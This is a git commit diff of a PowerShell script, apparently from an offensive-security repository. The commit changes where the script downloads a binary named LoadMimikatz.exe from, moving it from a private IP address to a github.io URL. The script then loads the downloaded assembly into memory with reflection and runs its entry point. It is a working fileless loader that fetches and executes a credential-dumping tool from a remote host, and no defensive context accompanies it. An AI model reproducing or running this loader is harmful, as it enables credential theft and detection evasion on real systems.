04e1fe222d8ab430fc9c924b9e1a66660253ed50
HakkYahud <108320420+HakkYahud@users.noreply.github.com>
2022-09-12 16:20:30 +0200

    Update PowershellAssembly.ps1

--- PowershellAssembly.ps1
+++ PowershellAssembly.ps1
@@ -1,9 +1,3 @@
-﻿#$assemblyPath = 'C:\Users\HakkYahud\Documents\Symantec\PELoaderMimikatz\LoadMimikatz.exe'
-#$assemblyByte = (Invoke-WebRequest "http://192.168.101.20:1996/LoadMimikatz.exe").Content
-#$assemblyByte = [System.IO.File]::ReadAllBytes($assemblyFile)
-
-$assemblyByte = (New-Object Net.WebClient).DownloadData("http://192.168.101.20:1996/LoadMimikatz.exe")
-$assemblyB64 = [System.Convert]::ToBase64String($assemblyByte)
-$assemblyByte = [System.Convert]::FromBase64String($assemblyB64)
+$assemblyByte = (New-Object Net.WebClient).DownloadData("https://hakkyahud.github.io/LoadMimikatz.exe")
 $assembly = [System.Reflection.Assembly]::Load($assemblyByte)
 $assembly.EntryPoint.Invoke($null, $null)
